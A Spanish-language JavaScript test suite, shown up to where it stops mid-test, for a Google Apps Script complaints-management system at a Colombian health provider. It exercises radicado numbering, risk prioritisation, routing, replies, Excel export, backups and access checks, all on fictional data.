// Pruebas de la versión 8 con un libro de más de 400 filas (datos ficticios).
const { Hoja, crear, Utilities } = require("./harness");
const TZ = process.env.SHEET_TZ || "America/Bogota";
let fallas = 0;
const assert = (c, m) => { if (!c) { console.log("FALLA:", m); fallas++; process.exitCode = 1; } else console.log("ok  ", m); };
const medianoche = s => Utilities.parseDate(s, TZ, "yyyy-MM-dd");

// ---------- libro: 450 registros (SIAU hasta 3514 y felicitaciones con la serie FEL de la primera versión, que v8.1 unifica) ----------
const cons = new Hoja("Consolidado_PQRS");
const H = ["CÓDIGO DE RADICACIÓN"]; for (let i = 2; i <= 53; i++) H.push("COL" + i);
H[31] = "TÉRMINO (días)"; H[35] = "DÍAS TRANSCURRIDOS";
H.forEach((h, i) => cons.poner(4, i + 1, h));
let r = 5, siau = 3100, fel = 0;
for (let i = 0; i < 450; i++, r++) {
  const esFel = i % 3 !== 0;
  const f = medianoche("2026-0" + (1 + (i % 8)) + "-1" + (i % 9));
  const cod = esFel ? "FEL-2026-0" + (1 + (i % 8)) + "-" + String(++fel).padStart(5, "0") : "SIAU-2026-0" + (1 + (i % 8)) + "-" + (++siau);
  [[1, cod], [2, esFel ? "QR - Formulario" : "Presencial"], [3, f], [4, f], [5, f], [6, f], [10, "Persona " + i], [22, i % 2 ? "C. LA PLAYA" : "P. LA 21"],
   [23, "URGENCIAS"], [27, esFel ? "FELICITACION" : "QUEJA"], [30, esFel ? "Excelente atención" : "Demora en la atención"], [31, esFel ? "" : "SEDE"],
   [37, "Respondida - Cerrada"]].forEach(([c, v]) => cons.poner(r, c, v));
}
cons.poner(r - 1, 1, "SIAU-2026-09-3514"); cons.poner(r - 1, 27, "QUEJA"); cons.poner(r - 1, 30, "Queja final"); cons.poner(r - 1, 31, "SEDE");
const traza = new Hoja("Trazabilidad"); traza.poner(4, 1, "FECHA Y HORA");
const resp = new Hoja("Responsables"); resp.poner(4, 1, "ID");
[[1, "URGENCIAS", "Ana", "Coord", "urg@miredips.org", "", "SI", "URGENCIAS", "", "urgencias; triage; observacion", "jefe.urg@miredips.org"],
 [2, "FARMACIA", "Jorge", "Regente", "farmacia@miredips.org", "", "SI", "FARMACIA", "", "medicamento; farmacia; insulina", ""],
 [3, "CONSULTA EXTERNA", "Carla", "Coord", "consulta@miredips.org", "", "SI", "CONSULTA EXTERNA", "", "consulta; control; prenatal; cita medica", ""],
 [4, "LABORATORIO", "Luis", "Bact", "lab@miredips.org", "", "SI", "LABORATORIO CLINICO", "", "laboratorio; examenes; bacteriologa", ""],
 [5, "TALENTO HUMANO", "", "", "th@miredips.org", "", "SI", "", "", "grosero; grosera; maltrato; falta de respeto", ""]]
  .forEach((f, i) => f.forEach((v, j) => resp.poner(5 + i, j + 1, v)));
const cfg = new Hoja("Config");
[["SEDE", 15, "Hábiles"], ["SUPER SALUD", 1, "Calendario"], ["SECRETARIA DE SALUD", 3, "Calendario"]].forEach((f, i) => f.forEach((v, j) => cfg.poner(6 + i, j + 1, v)));
[3174, 3, "SIAU", "siau@miredips.org", "(605) 000 0000", "300 000 0000", "", "Respuestas de formulario 1"].forEach((v, i) => cfg.poner(11 + i, 2, v));
const L = { "SEDE": ["C. LA PLAYA", "P. LA 21", "C. SUROCCIDENTE"], "SERVICIO": ["URGENCIAS", "FARMACIA", "CONSULTA EXTERNA", "LABORATORIO CLINICO"],
  "EPS / PRESTADOR": ["NUEVA EPS"], "CANAL": ["Presencial", "QR - Formulario", "Correo electrónico", "Telefónico"],
  "TIPO DE PQRS": ["PETICIÓN", "QUEJA", "RECLAMO", "SUGERENCIA", "FELICITACION", "DENUNCIA", "TUTELA"], "TIPO SOLICITANTE": ["USUARIO"],
  "TIPO DOCUMENTO": ["CEDULA DE CIUDADANIA", "TARJETA DE IDENTIDAD", "REGISTRO CIVIL"], "ENTIDAD PRESENTADA": ["SEDE", "SUPERSALUD", "SECRETARIA DE SALUD", "EPS"],
  "ESTADO": ["Recibida", "En gestión", "Respondida - Cerrada"], "POBLACIÓN DIFERENCIAL": ["No aplica", "Gestante", "Menor de edad"] };
Object.keys(L).forEach((k, j) => { cfg.poner(43, j + 1, k); L[k].forEach((v, i) => cfg.poner(44 + i, j + 1, v)); });
const form = new Hoja("Respuestas de formulario 1"); form.formUrl = "https://docs.google.com/forms/d/x/edit";
["Marca temporal", "Su opinión corresponde a:", "Nombre del paciente", "Correo electronico", "Sede de la institución donde consulto",
 "Servicio a la que va vinculada su opinión", "Descripción de su opinión"].forEach((t, i) => form.poner(1, i + 1, t));
const viejo = new Date(Date.now() - 20 * 86400000), nuevo = new Date(Date.now() - 3600000);
[[viejo, "Queja", "Vieja Usuaria", "vieja@correo.com", "Camino La Playa", "URGENCIAS", "Respuesta antigua ya migrada al histórico."],
 [nuevo, "Felicitación", "Nuevo Usuario", "nuevo@correo.com", "Camino Sur Occidente", "LABORATORIO CLINICO", "Gracias a la bacterióloga del laboratorio, muy amable."]]
  .forEach((f, i) => f.forEach((v, j) => form.poner(2 + i, j + 1, v)));

// ---------- correo simulado ----------
const H_ = {};
const MARCA = "Mensaje generado por el Sistema de PQRS de MiRed IPS.";
const FORWARDS = [];
function M(id, de, asunto, cuerpo) {
  const m = { getId: () => id, getFrom: () => de, getSubject: () => asunto, getPlainBody: () => cuerpo, getDate: () => new Date(Date.now() - 60000),
    getAttachments: () => [], getThread: () => m.hilo.t,
    reply() { m.hilo.msgs.push(M("r" + Math.random(), "SIAU <siau@miredips.org>", "Re: " + asunto, MARCA)); },
    forward(para, op) { FORWARDS.push({ id, para, html: op && op.htmlBody, cc: op && op.cc, asunto: op && op.subject }); } };
  return m;
}
function Hilo(id, msgs) { const h = { id, msgs, etq: [] }; h.t = { getId: () => id, getMessages: () => h.msgs, getLabels: () => h.etq,
  getFirstMessageSubject: () => h.msgs[0].getSubject(), addLabel: l => h.etq.push({ getName: () => l.getName() }) }; msgs.forEach(m => m.hilo = h); H_[id] = h; }
Hilo("p1", [M("pm1", "Oficina Jurídica <notificaciones@procuraduria.gov.co>", "Oficio 2026-7788 solicitud de información usuario", "Solicitamos información sobre la atención brindada a un usuario.")]);
Hilo("j1", [M("jm1", "Juzgado 3 Civil <j03cmbq@cendoj.ramajudicial.gov.co>", "Notificación auto 2026-00456", "Se notifica auto admisorio. Término 48 horas.")]);
const gmail = { getUserLabelByName: () => null, createLabel: n => ({ getName: () => n }), getAliases: () => [], search: () => Object.values(H_).map(h => h.t),
  getThreadById: id => H_[id] ? H_[id].t : null,
  getMessageById: id => { for (const h of Object.values(H_)) for (const m of h.msgs) if (m.getId() === id) return m; throw new Error("no"); } };

const G = crear({ "Consolidado_PQRS": cons, "Trazabilidad": traza, "Responsables": resp, "Config": cfg, "Mapeo_Formulario": new Hoja("Mapeo_Formulario"),
  "Respuestas de formulario 1": form }, gmail);
G.__props.AJUSTES = JSON.stringify({ desde: 1, autoInstitucional: true, autoUsuarios: true, acuseInstitucional: true, avisosSede: false, avisarA: "lider@miredips.org",
  webhookChat: "https://chat.googleapis.com/v1/spaces/X/messages", direccionFelicitaciones: "resumen", direccionAuto: false, avisoCierreArea: true });
const enviados = () => G.__enviados;
const fila = cod => G._filaDe(cod);
const val = (cod, col) => cons.celda(fila(cod), col);

console.log("---- v8: núcleo ----");
const boot = G.appBootstrap_();
assert(boot.migracion.hecho && G.__props.ESQUEMA === "8.5", "migración a la versión 8: " + boot.migracion.mensaje);
assert(G._finDatos_() === 454, "rango dinámico: último registro en la fila 454 (450 registros, más del antiguo tope de 400)");
assert(cons.celda(4, 54) && cons.celda(4, 57), "encabezados nuevos (nivel de riesgo … área sugerida)");
assert(G._hojaFestivos_().hoja.getLastRow() > 100 && cons.formulas["5:34"].indexOf("Festivos!") !== -1, "festivos en su hoja y fórmulas que la usan");
assert(Object.keys(cons.formulas).some(k => k === "654:36"), "fórmulas con colchón de 200 filas");
assert(cfg.celda(9, 1) === "EPS" && cfg.celda(9, 2) === 3, "término para EPS en la tabla de términos");
const codsBoot = []; for (let i = 5; i <= 454; i++) codsBoot.push(cons.celda(i, 1));
assert(codsBoot.every(c => /^SIAU-\d{4}-\d{2}-\d{4,}$/.test(c)), "una sola estructura de radicado: todo quedó SIAU-AAAA-MM-NNNN");
const unif = codsBoot.filter(c => +c.split("-")[3] > 3514).map(c => +c.split("-")[3]).sort((a, b) => a - b);
assert(unif.length === 299 && unif[0] === 3515 && unif[298] === 3813, "las 299 felicitaciones FEL reciben 3515…3813 en orden de radicación");
assert(/\[Radicado anterior: FEL-/.test(cons.d.map(f => f[50]).join(" ")), "el radicado anterior queda en OBSERVACIONES");
const radQ = G.apiRadicar_({ descripcion: "Me atendieron tarde en urgencias.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA",
  sede: "C. LA PLAYA", servicio: "URGENCIAS", correo: "q@correo.com", autorizacionDatos: "Sí autoriza · 23/9/2026" });
assert(radQ.codigo === "SIAU-2026-09-3814", "el consecutivo sigue después del mayor radicado: " + radQ.codigo);
assert(fila(radQ.codigo) === 455, "la radicación 451 se escribe en la fila 455 y se encuentra por radicado");
assert(/Sí autoriza/.test(val(radQ.codigo, 56)), "autorización de tratamiento de datos guardada");
const radF = G.apiRadicar_({ descripcion: "Felicito a la jefe de enfermería de urgencias, muy humana.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23",
  tipoPqrs: "FELICITACION", sede: "P. LA 21", servicio: "URGENCIAS", correo: "f@correo.com" });
assert(radF.codigo === "SIAU-2026-09-3815", "las felicitaciones usan la misma estructura y consecutivo: " + radF.codigo);
const radQ2 = G.apiRadicar_({ descripcion: "Otra queja por demora.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA", sede: "C. LA PLAYA" });
assert(radQ2.codigo === "SIAU-2026-09-3816", "consecutivo único para todos los tipos: " + radQ2.codigo);
const antes = radF.codigo;
const rec = G.apiReclasificar_(antes, "QUEJA");
assert(rec.codigo === antes && fila(antes) > 0, "al pasar de felicitación a queja el radicado no cambia: " + rec.codigo);
assert(G._trazaDe(rec.codigo).some(t => t.accion === "Radicación"), "la trazabilidad sigue al nuevo radicado");
assert(val(rec.codigo, 31) === "SEDE", "la queja reclasificada recibe entidad presentada SEDE (término de 15 días)");

console.log("---- v8: formulario QR con fecha de corte ----");
G._setParam(9, new Date(Date.now() - 5 * 86400000));
const imp = G.apiImportarRespuestasForm_({ notificar: false });
assert(imp.ok && imp.importadas === 1 && /anteriores a la fecha de corte/.test(imp.mensaje), "solo importa lo posterior al corte: " + imp.mensaje);
const cFel = cons.celda(G._finDatos_(), 1);
assert(cFel === "SIAU-" + Utilities.formatDate(nuevo, TZ, "yyyy-MM") + "-3817" && cons.celda(G._finDatos_(), 22) === "C. SUROCCIDENTE", "respuesta del QR con radicado SIAU y sede normalizada («Camino Sur Occidente» → C. SUROCCIDENTE): " + cFel);
assert(G.apiImportarRespuestasForm_({ notificar: false }).importadas === 0, "no duplica al importar otra vez");

console.log("---- v8: priorización (circulares Supersalud) ----");
const ev = (d) => G.apiEvaluarRiesgo_(d);
const e1 = ev({ tipoPqrs: "QUEJA", descripcion: "Mi hija de 3 años convulsionó en la sala de espera y no le dan la remisión a pediatría.", servicio: "URGENCIAS" });
assert(e1.nivel === "Vital NNA" && e1.poblacion.indexOf("NNA") !== -1, "riesgo vital en menor de edad → 8 h: " + e1.razones.join(", "));
const e2 = ev({ tipoPqrs: "QUEJA", descripcion: "Mi papá tiene dolor en el pecho desde anoche y nadie lo valora.", edad: 45 });
assert(e2.nivel === "Vital", "riesgo vital adulto → 24 h: " + e2.razones.join(", "));
const e3 = ev({ tipoPqrs: "RECLAMO", descripcion: "Estoy embarazada de 30 semanas y no me asignan la cita de control prenatal.", poblacion: "Gestante" });
assert(e3.nivel === "Priorizado" && e3.poblacion.indexOf("Gestante") !== -1, "gestante con barrera de acceso → priorizada 48 h");
const e4 = ev({ tipoPqrs: "QUEJA", descripcion: "La recepcionista fue grosera conmigo y me hizo esperar." });
assert(!e4.nivel, "queja de trato sin riesgo → término normal");
const e5 = ev({ tipoPqrs: "FELICITACION", descripcion: "Gracias por salvar a mi hijo que convulsionaba." });
assert(!e5.nivel, "las felicitaciones no se priorizan");
const e6 = ev({ tipoPqrs: "QUEJA", descripcion: "Hace mucho calor, le da como desmayo a uno en la sala." });
assert(e6.nivel !== "Vital" && e6.nivel !== "Vital NNA", "un «desmayo» por calor no se vuelve riesgo vital");
assert(e1.areas.length && e1.areas[0].area === "URGENCIAS", "área sugerida mientras se escribe: " + (e1.areas[0] || {}).area);
const radV = G.apiRadicar_({ descripcion: "Mi hijo de 2 años no respira bien y lleva 4 horas esperando en urgencias sin valoración.", fechaRecepcion: "2026-09-23",
  fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA", sede: "C. LA PLAYA", servicio: "URGENCIAS", correo: "madre@correo.com", edad: 2 });
assert(radV.riesgo && radV.riesgo.nivel === "Vital NNA", "radicación presencial priorizada sola");
assert(val(radV.codigo, 28) === "RIESGO VITAL NNA · 8 H" && /Vital NNA · 8 h/.test(val(radV.codigo, 54)), "categoría y nivel de riesgo en el consolidado");
assert(G.UrlFetchApp.llamadas.some(l => /RIESGO VITAL NNA/.test(l.texto) && l.texto.indexOf("madre@correo.com") === -1), "alerta inmediata a Google Chat, sin datos personales");
assert(enviados().some(e => /RIESGO VITAL NNA/.test(e.asunto) && !/no respira/.test(e.html)), "alerta por correo sin la descripción del caso");
const acuseV = enviados().filter(e => e.para === "madre@correo.com").pop();
assert(acuseV && /Prioritaria/.test(acuseV.html) && /8 horas/.test(acuseV.html) && /Ley 1581/.test(acuseV.html), "el acuse dice la clasificación, el término y el aviso de protección de datos");
const det = G.apiDetalle_(radV.codigo);
assert(det.nivelRiesgo === "Vital NNA" && /8 horas/.test(det.terminoTexto) && det.limiteHoras, "detalle con límite en horas: " + det.limiteHoras);
const nov = G.apiNovedades_(Date.now() - 60000, false);
assert(nov.eventos.some(x => x.alerta && x.codigo === radV.codigo), "la plataforma recibe el evento de alerta (alarma sonora)");
const pri = G.apiPrioritarias_();
assert(pri.items[0].codigo === radV.codigo && pri.items[0].horasRestantes <= 8, "la vista Prioritarias ordena primero el riesgo vital NNA con su cuenta regresiva");
// fila abierta sin priorizar que el comando debe detectar
const rIdx = G._finDatos_() + 1;
[[1, "SIAU-2026-09-3600"], [5, medianoche("2026-09-22")], [6, new Date()], [22, "P. LA 21"], [27, "RECLAMO"], [31, "SEDE"], [37, "Recibida"],
 [30, "Soy paciente con cáncer y me suspendieron la quimioterapia por falta de autorización."]].forEach(([c, v]) => cons.poner(rIdx, c, v));
const id = G.apiIdentificarPrioritarias_();
assert(id.nuevas.some(x => x.codigo === "SIAU-2026-09-3600" && x.nivel === "Vital"), "comando «Identificar prioritarias» detecta casos abiertos: " + id.mensaje);
const fx = G.apiFijarRiesgo_("SIAU-2026-09-3600", "Priorizado", "Revisado por el SIAU");
assert(fx.nivelRiesgo === "Priorizado" && fx.riesgoManual, "ajuste manual del nivel de riesgo");
G.apiIdentificarPrioritarias_();
assert(G.apiDetalle_("SIAU-2026-09-3600").nivelRiesgo === "Priorizado", "el comando respeta el ajuste manual");
// alertas a la mitad y al final de la meta de 8 h
cons.poner(fila(radV.codigo), 6, new Date(Date.now() - 5 * 3600000));
const a1 = G.revisarAlertas();
assert(a1.alertas >= 1 && enviados().some(e => /\[ALERTA PQRS\]/.test(e.asunto)), "alerta a la mitad del término (4 h de 8)");
cons.poner(fila(radV.codigo), 6, new Date(Date.now() - 9 * 3600000));
const a2 = G.revisarAlertas();
assert(a2.alertas >= 1 && G.revisarAlertas().alertas === 0, "alerta al cumplirse las 8 h, una sola vez");

console.log("---- v8: directorio y direccionamiento ----");
const sug = G.apiSugerirArea_(radQ.codigo);
assert(sug.sugerencias[0].area === "URGENCIAS", "sugerencia por servicio del directorio");
G.apiEnviarAlArea_(radQ.codigo, 1, "");
assert(enviados().some(e => e.para === "urg@miredips.org" && /jefe\.urg@miredips\.org/.test(e.cc || "")), "envío al área con los correos en copia del directorio");
const felPend = G.apiDireccionarFelicitaciones_(true);
assert(felPend.pendientes >= 1, "felicitaciones pendientes por entregar: " + JSON.stringify(felPend));
const felEnv = G.apiDireccionarFelicitaciones_();
assert(felEnv.enviadas >= 1 && enviados().some(e => /^\[RECONOCIMIENTOS\]/.test(e.asunto)), "resumen de reconocimientos por área: " + felEnv.mensaje);
assert(/cerrada/i.test(val(cFel, 37)), "la felicitación queda entregada y cerrada");
G.__props.AJUSTES = JSON.stringify(Object.assign(JSON.parse(G.__props.AJUSTES), { direccionAuto: true }));
const radA = G.apiRadicar_({ descripcion: "No me entregaron la insulina en la farmacia, fui tres veces por el medicamento.", fechaRecepcion: "2026-09-23",
  fechaRadicacion: "2026-09-23", tipoPqrs: "RECLAMO", sede: "C. LA PLAYA", servicio: "FARMACIA", correo: "insulina@correo.com", edad: 40 });
assert(radA.direccionada === "FARMACIA" && /gestión/i.test(val(radA.codigo, 37)), "direccionamiento automático con área inequívoca: " + radA.direccionada);

console.log("---- v8: respuesta, cierre y redacción ----");
G.apiRegistrarRespuestaArea_(radQ.codigo, "BUENAS TARDES SIAU\n\nSE HABLO CON EL MEDICO DE TURNO Y SE REFORZO EL TRIAGE EN LA TARDE.\n\nCORDIALMENTE\nCOORDINACION URGENCIAS", "2026-09-23");
const red = G.apiRedactarRespuesta_(radQ.codigo, "");
assert(red.ok && /^Apreciado\(a\)/.test(red.texto) && /Se habló|Se hablo/.test(red.texto) && !/CORDIALMENTE|BUENAS TARDES SIAU/.test(red.texto) && /SIAU-2026-09-3814/.test(red.texto),
  "redacción formal: saludo, referencia al radicado, sin firma interna ni mayúsculas sostenidas");
const cierre = G.apiResponderUsuario_(radQ.codigo, red.texto, true);
assert(cierre.aviso.area && enviados().some(e => /^\[CERRADA · PQRS SIAU-2026-09-3814\]/.test(e.asunto)), "cuarto paso: el área recibe el aviso de cierre");

console.log("---- v8: entes de control y juzgados ----");
const pc = G._procesarCorreo_();
const cods = pc.codigos.map(c => [c, val(c, 28)]);
assert(cods.some(([c, k]) => k === "REQUERIMIENTO ENTE DE CONTROL"), "Procuraduría → requerimiento de ente de control (10 días hábiles): " + JSON.stringify(cods));
assert(cods.some(([c, k]) => k === "TUTELA"), "correo de un juzgado → tutela");
assert(G._trazaDe("—").some(t => t.accion === "Correo de ente de control") || traza.d.some(f => f[2] === "Correo de ente de control"), "evento «correo de ente de control» para la alarma de la plataforma");

console.log("---- v8: portal y diagnóstico ----");
const salida = JSON.parse(G.doPost({ postData: { contents: JSON.stringify({ fn: "estadoAcceso", args: [] }) } }).getContent());
assert(salida.r && salida.r.institucion, "doPost responde las funciones públicas");
const bloqueo = JSON.parse(G.doPost({ postData: { contents: JSON.stringify({ fn: "apiBandeja_", args: [] }) } }).getContent());
assert(bloqueo.__error, "doPost no expone funciones internas");
const sinSesion = JSON.parse(G.doPost({ postData: { contents: JSON.stringify({ fn: "api", args: ["x", "apiBandeja", []] }) } }).getContent());
assert(sinSesion.r && sinSesion.r.__sesion === false, "doPost exige sesión para la API");
{ // cuenta personal predeterminada del navegador: el mensaje lo dice y cómo corregirlo
  const oSS = G.SpreadsheetApp.getActiveSpreadsheet, oSe = G.Session.getEffectiveUser, ssAntes = G._SS_;
  G._SS_ = null; G.__props.CONSOLIDADO_ID = "";
  G.SpreadsheetApp.getActiveSpreadsheet = () => { throw new Error("No cuentas con el permiso necesario para acceder al documento solicitado."); };
  G.Session.getEffectiveUser = () => ({ getEmail: () => "persona.ficticia@gmail.com" });
  const li = G.iniciarSesion("x", "y");
  G.SpreadsheetApp.getActiveSpreadsheet = oSS; G.Session.getEffectiveUser = oSe; G._SS_ = ssAntes;
  assert(!li.ok && /persona\.ficticia@gmail\.com/.test(li.mensaje) && /cuenta personal/.test(li.mensaje) && /incógnito/.test(li.mensaje),
    "si Google usa la cuenta personal, el ingreso dice cuál es y cómo corregirlo");
  assert(G.verificarCuenta() === "Solo se puede ejecutar desde el editor de Apps Script." || /Cuenta que ejecuta/.test(G.verificarCuenta()), "verificarCuenta responde");
}
const dg = G.apiDiagnostico_();
assert(dg.items.length >= 10 && dg.items.some(x => !x.ok && /Disparador/.test(x.titulo)), "diagnóstico de la puesta en marcha con soluciones");
assert(G._festivosColombia_(2026).map(x => x[0]).join() === "2026-01-01,2026-01-12,2026-03-23,2026-04-02,2026-04-03,2026-05-01,2026-05-18,2026-06-08,2026-06-15,2026-06-29,2026-07-20,2026-08-07,2026-08-17,2026-10-12,2026-11-02,2026-11-16,2026-12-08,2026-12-25",
  "festivos 2026 de Colombia calculados (Ley 51 de 1983)");
console.log(fallas ? "fin v8 con " + fallas + " falla(s)" : "fin v8");
// muestras para revisar el diseño (npm run correos)
const fsm = require("fs"); fsm.mkdirSync(__dirname + "/salida", { recursive: true });
const muestra = (n, re) => { const e = enviados().filter(x => re.test(x.asunto)).pop(); if (e && e.html) fsm.writeFileSync(__dirname + "/salida/muestra_v8_" + n + ".html", e.html); };
muestra("acuse_prioritario", /^Radicación de su queja/);
muestra("alerta_riesgo", /RIESGO VITAL NNA/);
muestra("reconocimientos", /^\[RECONOCIMIENTOS\]/);
muestra("cierre_area", /^\[CERRADA/);
muestra("acuse_felicitacion", /^Gracias por su felicitación/);

// =====================================================================================
console.log("---- v8.2: radicación rápida, avisos en segundo plano, Excel y respaldo ----");
// Rango dinámico leyendo solo el final de la hoja
const finReal = G._finDatos_();
const leidas = []; const getRangeOrig = cons.getRange.bind(cons);
cons.getRange = function (r, c, nr, nc) { leidas.push(nr || 1); return getRangeOrig(r, c, nr, nc); };
G._FIN_ = { fin: 0, ultima: -1 };
const finRapido = G._finDatos_();
cons.getRange = getRangeOrig;
assert(finRapido === finReal && leidas.reduce((a, b) => a + b, 0) <= 1000, "el final de los datos se halla leyendo el último bloque, no toda la hoja: " + leidas.reduce((a, b) => a + b, 0) + " filas leídas");

// Consecutivo guardado y candado
const ultimoGuardado = +G.__props.ULTIMO_CONSECUTIVO;
const rapida = G.apiRadicar_({ descripcion: "Queja por la demora en la entrega de resultados.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA",
  sede: "C. LA PLAYA", servicio: "URGENCIAS", correo: "rapida@correo.com", diferir: true });
assert(+rapida.codigo.split("-")[3] === ultimoGuardado + 1 && +G.__props.ULTIMO_CONSECUTIVO === ultimoGuardado + 1, "el consecutivo guardado avanza con cada radicado: " + rapida.codigo);
assert(rapida.pendienteAvisos === true && /segundo plano/.test(rapida.acuse), "con «diferir» el radicado se entrega sin esperar el correo");
assert(!enviados().some(e => e.para === "rapida@correo.com"), "todavía no salió el acuse al usuario");
assert(JSON.parse(G.__props.COLA_AVISOS).some(x => x.c === rapida.codigo), "el radicado queda en la cola de avisos");
const aviso = G.apiNotificarRadicacion_(rapida.codigo);
assert(aviso.ok && /enviado a rapida@correo.com/.test(aviso.acuse) && enviados().some(e => e.para === "rapida@correo.com"), "segundo paso: sale el acuse al usuario: " + aviso.acuse);
const nEnv = enviados().length;
const repetido = G.apiNotificarRadicacion_(rapida.codigo);
assert(repetido.yaEnviado && enviados().length === nEnv, "un segundo llamado no repite los avisos");
const otra = G.apiRadicar_({ descripcion: "Reclamo por medicamento incompleto.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "RECLAMO",
  sede: "C. LA PLAYA", correo: "otra@correo.com", diferir: true });
G.procesarCorreoEntrante();
assert(!enviados().some(e => e.para === "otra@correo.com"), "la red de seguridad no se adelanta a la interfaz (espera 1 minuto)");
const cola = JSON.parse(G.__props.COLA_AVISOS); cola.forEach(x => { x.t -= 120000; }); G.__props.COLA_AVISOS = JSON.stringify(cola);
G.procesarCorreoEntrante();
assert(enviados().some(e => e.para === "otra@correo.com") && JSON.parse(G.__props.COLA_AVISOS).length === 0, "si el navegador se cerró, la revisión de 5 minutos envía los avisos pendientes");
const tope = +otra.codigo.split("-")[3];
const filaTope = fila(otra.codigo); cons.poner(filaTope, 1, "SIAU-2026-09-" + (tope + 40)); G._invalidarDatos_();
const sigue = G.apiRadicar_({ descripcion: "Queja por trato.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA", sede: "C. LA PLAYA" });
assert(+sigue.codigo.split("-")[3] === tope + 41, "si alguien escribe a mano un consecutivo mayor al final de la hoja, el siguiente lo respeta: " + sigue.codigo);

// Excel
const ex = G.apiExportarExcel_({ anio: 2026, mes: 9 });
const libro = G.__exportaciones[G.__exportaciones.length - 1];
assert(ex.ok && ex.filas > 0 && ex.base64 && /^Consolidado_PQRS_2026-09_/.test(ex.nombre) && /\.xlsx$/.test(ex.nombre), "exporta el consolidado de un mes a .xlsx: " + ex.nombre + " · " + ex.filas + " filas");
assert(Object.keys(libro.hojas).filter(k => k !== "Hoja 1").sort().join() === "Consolidado,Datos,Panel,Por mes,Por motivo,Por riesgo,Por sede,Por servicio,Resumen", "el Excel del administrador lleva Consolidado, Resumen e indicadores (nunca la hoja Usuarios)");
assert(libro.hojas.Consolidado.celda(1, 1) === "CÓDIGO DE RADICACIÓN" && libro.hojas.Consolidado.getLastRow() === ex.filas + 1, "encabezados y filas completos en el libro exportado");
assert(libro.hojas.Resumen.d.some(f => f[0] === "POR TIPO") && libro.hojas.Resumen.d.some(f => f[0] === "POR SEDE"), "hoja Resumen con totales por tipo y sede");
assert(G.DriveApp.__temporales[libro.id] === true, "el libro temporal se manda a la papelera");
const carpeta = G.DriveApp.__carpetas["/PQRS · Respaldos (Excel)"];
assert(carpeta && carpeta.archivos.some(a => a.nombre === ex.nombre), "el archivo queda guardado en la carpeta de Drive");
const sinFiltro = G.apiExportarExcel_({});
assert(sinFiltro.filas > ex.filas && /^Consolidado_PQRS_historico_/.test(sinFiltro.nombre), "sin filtros exporta todo el histórico: " + sinFiltro.filas);
G.SESION = { usuario: "t", nombre: "T", rol: "Técnico", todas: false, sedes: ["C. LA PLAYA"], sedesNorm: [G._norm("C. LA PLAYA")] };
const soloSede = G.apiExportarExcel_({});
G.SESION = null;
assert(soloSede.filas > 0 && soloSede.filas < sinFiltro.filas, "la exportación respeta las sedes asignadas: " + soloSede.filas + " de " + sinFiltro.filas);
assert(G.RUTAS.apiExportarExcel[1] === "leer" && G.RUTAS.apiRespaldarAhora[1] === "admin", "el respaldo es del administrador; el Excel lo piden todos pero cada rol recibe su plantilla");

// Respaldo diario
const hoyTxt = Utilities.formatDate(new Date(), TZ, "yyyy-MM-dd");
const viejoResp = carpeta.createFile({ getName: () => "Respaldo_diario_2020-01-01.xlsx" }); viejoResp.creado = new Date(Date.now() - 40 * 86400000);
const noMio = carpeta.createFile({ getName: () => "Consolidado_PQRS_manual.xlsx" }); noMio.creado = new Date(Date.now() - 400 * 86400000);
G.__props.AJUSTES = JSON.stringify(Object.assign(JSON.parse(G.__props.AJUSTES), { respaldoCorreo: "river@correo.com" }));
const resp1 = G.apiRespaldarAhora_(), resp2 = G.apiRespaldarAhora_();
const delDia = carpeta.archivos.filter(a => !a.borrado && a.nombre === "Respaldo_diario_" + hoyTxt + ".xlsx");
assert(resp1.ok && delDia.length === 1 && resp2.ok, "un solo respaldo por día (el segundo reemplaza al primero): " + resp1.mensaje);
assert(viejoResp.borrado && !noMio.borrado, "se borran los respaldos de más de 14 días y no se tocan las exportaciones manuales");
assert(carpeta.vistas.indexOf("river@correo.com") !== -1 && /compartida con river@correo.com/.test(resp1.mensaje), "la carpeta se comparte (solo lectura) con la cuenta indicada");
assert(G.apiGuardarAjustes_({ respaldoCorreo: "no-es-un-correo" }).ok === false, "valida el correo del respaldo");
G.rutinaDiaria();
assert(cons && G.__props.AJUSTES && carpeta.archivos.filter(a => a.nombre === "Respaldo_diario_" + hoyTxt + ".xlsx" && !a.borrado).length === 1, "la rutina diaria hace el respaldo");
process.env.XLSX_FALLA = "1";
G.rutinaDiaria();
delete process.env.XLSX_FALLA;
assert(traza.d.some(f => f[2] === "Respaldo en Drive falló"), "si el respaldo falla, queda en la trazabilidad y la rutina sigue");

// =====================================================================================
console.log("---- v8.3: EPS y entes sin correos automáticos, revisión cada 3 minutos y push ----");
G.UrlFetchApp.llamadas.length = 0;
G.__props.AJUSTES = JSON.stringify(Object.assign(JSON.parse(G.__props.AJUSTES), { pushTema: "pqrs-miredips-prueba-123", webhookChat: "" }));
const codProc = (() => { const f = cons.d.map((r, i) => ({ r, i })).filter(x => /Remitente institucional/.test(String(x.r[50] || ""))); return f.length ? f[f.length - 1].r[0] : ""; })();
assert(codProc, "hay radicados de entes de control en la hoja para probar");
const filaInst = fila(codProc);
cons.poner(filaInst, 12, "ente@procuraduria.gov.co"); cons.poner(filaInst, 47, ""); cons.poner(filaInst, 49, "");
const nEnv0 = enviados().length;
assert(/no aplica/.test(G._acuseRecepcion_(filaInst)) && enviados().length === nEnv0, "el acuse automático no se envía a un remitente institucional");
const respInst = G.apiResponsables_().filter(r => r.activo && G._correoOk(r.correo))[0];
cons.poner(filaInst, 34, new Date(Date.now() + 5 * 86400000));   // la fórmula de vencimiento no se evalúa en las pruebas
const envArea = G.apiEnviarAlArea_(codProc, respInst.id, "prueba");
assert(envArea.ok !== false && /no aplica \(remitente institucional\)/.test(envArea.aviso.usuario), "al enviar al área no se le avisa «en trámite» al ente: " + (envArea.aviso && envArea.aviso.usuario));
assert(!enviados().some(e => e.para === "ente@procuraduria.gov.co"), "ningún correo llegó al remitente institucional");

// Revisión cada 3 minutos: el disparador corre cada minuto y se salta lo que llega antes
G.__props.ULTIMA_REVISION_CORREO = String(Date.now() - 60000);
const salto = G.procesarCorreoEntrante({ triggerUid: "t1" });
